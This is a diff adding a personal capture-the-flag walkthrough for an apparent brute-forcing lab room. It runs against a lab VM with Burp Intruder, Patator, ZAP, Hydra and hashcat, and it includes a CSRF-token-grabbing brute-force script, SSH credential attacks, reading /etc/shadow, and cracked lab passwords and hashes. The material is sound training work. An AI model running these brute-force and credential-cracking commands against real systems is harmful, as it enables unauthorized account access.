@@ -1,0 +1,371 @@
+BRUTE FORCE HEROES.
+
+
+
+
+[>>> TASK 1: LAUNCH THE VM]
+[1.1. START YOUR ENGINES! SORRY... VM!]
+Nothing to answer here.
+
+
+
+
+[>>> TASK 2: INTRODUCTION]
+[2.1. READ THE ABOVE AND ENSURE YOU ARE READY TO START]
+Nothing to do here.
+
+
+
+
+[>>> TASK 3: GETTING STARTED - BURP SUITE]
+[ACTION: get example request to http://10.10.208.214/login.php]
+[OUTPUT]
+POST /login.php HTTP/1.1
+Host: 10.10.208.214
+Content-Length: 85
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.208.214
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.208.214/login.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=t70sfnoaffqtaluh8v1c6p2hnq; security=impossible
+Connection: keep-alive
+
+username=test1&password=test1&Login=Login&user_token=d7851c5bef08fce319bdd67fade632e2
+
+
+[ACTION: get example reply to http://10.10.208.214/login.php]
+HTTP/1.1 302 Found
+Date: Wed, 30 Jul 2025 20:47:40 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: login.php
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+
+[3.1. WHAT DOES HTTP RESPONSE CODE 302 MEAN?]
+[ANSWER]
+found
+
+
+
+[NOTE]
+New ip due to machine reboot: 10.10.53.175
+[>>> TASK 4: BRUTE FORCING - BURP SUITE]
+[ACTION: login bruteforce via burpsuite]
+Steps:
+1. Intercept another request via proxy.
+2. Right click the post request (login request) > Send to Intruder.
+3. Go intruder tab.
+4. Clear $.
+5. Select "passwords".
+6. Add $.
+7. Payloads (right side bar) > Payload configuration > Load.
+8. Upload file provided in room task 3: passwords-1628441697834.txt.
+9. Start attack.
+[OUTPUT (line 26)]
+26 sunshine 302 50 337
+
+
+
+[4.1. WHAT'S AN EASY WAY FOR US TO TELL THE DIFFERENCE BETWEEN A FAILED AND A SUCCESFUL LOGIN ATTEMPT IN THE ABOVE?]
+[ANSWER]
+location response header
+
+
+
+[4.2. CAN WE USE BURP TO EFFECTIVELY BRUTE FORCE THE LOGIN IN THIS INSTANCE?]
+[ANSWER]
+nay
+
+
+
+
+[>>> TASK 5: BRUTE FORCING - PATATOR]
+[ACTION: display patator http_fuzz module help]
+patator http_fuzz -h
+[OUTPUT (snippet)]
+Examples:
+http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
+http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401 
+http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
+[NOTE]
+Command:
+patator http_fuzz method=<HTTP METHOD> \
+url<target url> \
+body=<data> \
+header=<headers> \
+-x quit:<condition
+>
+My command (body based on burpsuite output):
+patatpr http_fuzz method=POST \
+url="http://10.10.53.175/login.php" \
+body="username=admin&password=password&Login=Login&user_token=4b03a00415cc29b88cb5c8261ae4e4af" \
+-x quit:fgrep!=login.php
+
+
+[NOTE]
+We need to change cookie and user_token values with each attempt.
+[ACTION: create script]
+Content:
+IP=10.10.53.175
+
+CSRF=$(curl -s -c dvwa.cookie "${IP}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+
+SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
+
+echo "The CSRF is: $CSRF"
+
+echo "The PHPSESSID is: $SESSIONID"
+
+patator http_fuzz method=POST --threads=64 timeout=10 \
+url="http://${ip}/login.php" \
+0=passwords.txt \
+body="username=admin&password=FILE0&Login=Login&user_token=${CSRF}" \
+header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" \
+-x quit:fgrep!=login.php
+
+
+
+[5.1. WHAT ACTION CAN WE USE TO SHOW ONLY THE CORRECT PASSWORD (THE ANSWER INCLUDES ' ')?]
+[ANSWER]
+-x ignore:fgrep=’Location: login.php’
+
+
+
+[5.2. WHAT IS THE ADMIN PASSWORD?]
+[NOTE]
+I had to fix url line. Changed ip -> IP
+Added -x ignore:fgrep=’Location: login.php’
+[ACTION: run script]
+nano bruteforce_script.sh
+chmod +x brute_script.sh
+chmod +x brute_script.sh
+[OUTPUT]
+1qaz@WSX
+[ANSWER]
+1qaz@WSX
+
+
+
+
+[>>> TASK 6: BRUTE FORCING - ZAP]
+[ACTION: install and run zap]
+sudo apt install zaproxy
+zaproxy &
+
+
+[ACTION: follow zap bruteforce steps]
+1. Click manual explore (right quick start window).
+2. Url to explore: 10.10.53.175
+3. Launch browser.
+4. Log in with admin|1qaz@WSX
+5. Go http://10.10.53.175/security.php
+6. Change: Impossible -> Low
+7. Submit
+8. Go http://10.10.53.175/vulnerabilities/brute/
+9. Log in creds: admin|1qaz@WSX
+10. Logout
+11. Attempt wrong log in: wrong1|wrong1
+12. Go zap history tab.
+13. Wrong login, select username value > Fuzz > Payloads > Add > > Type file > add userlist-1628709824038.txt > Add > Ok
+14. Select password > Add > add password list from previous task 
+15. Start fuzzer.
+
+
+
+[6.1. WHAT IS THE USERNAME YOU FOUND?]
+[ANSWER]
+buster
+
+
+
+[6.2. WHAT IS THEIR PASSWORD?]
+[ANSWER]
+rhymes	
+
+
+
+
+[TASK 7: BRUTE FORCING - SSH (HYDRA + PATATOR)]
+[NOTE]
+Passwords:
+Task 5: 1qaz@WSX
+Task 6: rhymes
+I created encoded_passwords.txt with hex, base64 and url of each. Contents:
+31 71 61 7a 40 57 53 58
+MXFhekBXU1g=
+1qaz%40WSX
+72 68 79 6d 65 73
+cmh5bWVz
+rhymes
+
+
+
+[7.1. WHAT IS THE SSH USERNAME?]
+[ACTION: bruteforce ssh login]
+hydra -f -L userlist-1628709824038.txt -P encoded_passwords.txt 10.10.53.175 -t 4 ssh -V
+[OUTPUT]
+[22][ssh] host: 10.10.53.175   login: tommyboy1   password: 1qaz%40WSX
+[NOTE]
+Equivalent patator command syntax:
+patator sshlogin host=10.10.53.175 user=FILE0 password=@@FILE1@@_ 0=userlist.txt 1=foundpasswords.txt -x ignore:mesg='Authentication failed.' -x quit:mesg!='Authentication failed.'  -e @@_:<encoding_type>
+(last parameter needs to be defined)
+Base64 patator command:
+patator ssh_login host=10.10.53.175 user=FILE0 password=FILE1 \
+  0=~/unencoded_passwords.txt 1=~/passwords-1628441697834.txt \
+  -x ignore:mesg='Authentication failed.' \
+  -x quit:mesg!='Authentication failed.' \
+  -e FILE1:base64
+Hex patator command:
+patator ssh_login host=10.10.53.175 user=FILE0 password=FILE1 \
+  0=~/unencoded_passwords.txt 1=~/passwords-1628441697834.txt \
+  -x ignore:mesg='Authentication failed.' \
+  -x quit:mesg!='Authentication failed.' \
+  -e FILE1:hex
+[ANSWER]
+tommyboy1
+
+
+
+[7.2. WHAT IS THEIR PASSWORD (THE ENCODED VERSION)?]
+[ANSWER (based on last question output)]
+1qaz%40WSX
+
+
+
+[7.3. WHAT KIND OF ENCODING IS THIS?]
+[ANSWER]
+url
+
+
+
+
+[>>> TASK 8: BRUTE FORCING - HASHES]
+[8.1. WHICH USER CAN WE CRACK THE PASSWORD FOR?]
+[NOTE]
+Bruteforced ssh creds: tommyboy1|1qaz%40WSX
+[ACTION: ssh into target]
+ssh tommyboy1@10.10.53.175
+
+
+[ACTION: display shadow]
+sudo cat /etc/shadow
+[OUTPUT]
+tommyboy1 is not in the sudoers file.  This incident will be reported.
+
+
+[ACTION: check shadow permissions]
+ls -l /etc/shadow
+[OUTPUT]
+-rw-r--r-- 1 root shadow 1245 Jul 31 17:21 /etc/shadow
+
+
+[ACTION: display shadow without sudo]
+cat /etc/shadow
+[OUTPUT]
+root:*:18659:0:99999:7:::
+daemon:*:18659:0:99999:7:::
+bin:*:18659:0:99999:7:::
+sys:*:18659:0:99999:7:::
+sync:*:18659:0:99999:7:::
+games:*:18659:0:99999:7:::
+man:*:18659:0:99999:7:::
+lp:*:18659:0:99999:7:::
+mail:*:18659:0:99999:7:::
+news:*:18659:0:99999:7:::
+uucp:*:18659:0:99999:7:::
+proxy:*:18659:0:99999:7:::
+www-data:*:18659:0:99999:7:::
+backup:*:18659:0:99999:7:::
+list:*:18659:0:99999:7:::
+irc:*:18659:0:99999:7:::
+gnats:*:18659:0:99999:7:::
+nobody:*:18659:0:99999:7:::
+systemd-network:*:18659:0:99999:7:::
+systemd-resolve:*:18659:0:99999:7:::
+systemd-timesync:*:18659:0:99999:7:::
+messagebus:*:18659:0:99999:7:::
+syslog:*:18659:0:99999:7:::
+_apt:*:18659:0:99999:7:::
+tss:*:18659:0:99999:7:::
+uuidd:*:18659:0:99999:7:::
+tcpdump:*:18659:0:99999:7:::
+landscape:*:18659:0:99999:7:::
+pollinate:*:18659:0:99999:7:::
+usbmux:*:18846:0:99999:7:::
+sshd:*:18846:0:99999:7:::
+systemd-coredump:!!:18846::::::
+tommyboy1:$6$sOofVCulSPJdTck8$XpWS5BQL9eb9sZgGeTQsj0XhxjSOWCr8FHH33ZfgBqXP31rlwy086WRc.a6GShUFeKGzNqbCYEwGEq8Ye3Szb0:18846:0:99999:7:::
+lxd:!:18846::::::
+mysql:!:18846:0:99999:7:::
+crackme:$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/:18867:0:99999:7:::
+ubuntu:!:20300:0:99999:7:::
+[NOTE]
+Requested user is:
+crackme:$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/:18867:0:99999:7:::
+[ANSWER]
+crackme
+
+
+
+[7.2. WHAT MODE DO WE NEED FOR THE USER'S HASH?]
+[ACTION: identify hash type]
+hashid '$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/'
+[OUTPUT]
+[+] SHA-512 Crypt 
+[ANSWER]
+1800
+
+
+
+[7.3. WHAT IS THE CRACKED PASSWORD?]
+[ACTION: prepare hash txt]
+echo '$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/' > crackme_hash.txt
+
+
+[NOTE]
+Hashcat bruteforce wo wordlist syntax:
+hashcat -a 3 -m <mode> <hash_file> <mask>
+[ACTION: run hashcat with requested settings]
+hashcat -a 3 -m 1800 crackme_hash.txt ?l?l?d?l?l -S
+[OUTPUT]
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZ...ybDOa/
+Time.Started.....: Thu Jul 31 23:04:27 2025 (8 mins, 59 secs)
+Time.Estimated...: Thu Jul 31 23:13:26 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?l?l?d?l?l [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      731 H/s (16.81ms) @ Accel:64 Loops:1024 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 408448/4569760 (8.94%)
+Rejected.........: 0/408448 (0.00%)
+Restore.Point....: 408384/4569760 (8.94%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
+Candidate.Engine.: Host Generator + PCIe
+Candidates.#1....: cr4ck -> gu0si
+Hardware.Mon.#1..: Temp: 69c Util: 84%
+
+Started: Thu Jul 31 23:03:57 2025
+Stopped: Thu Jul 31 23:13:28 2025
+[ANSWER]
+cr4ck
+
+
+
+[7.4. WHAT IS THE MASK VALUE WE NEED TO USE?]
+[ANSWER (based on last question)]
+?l?l?d?l?l
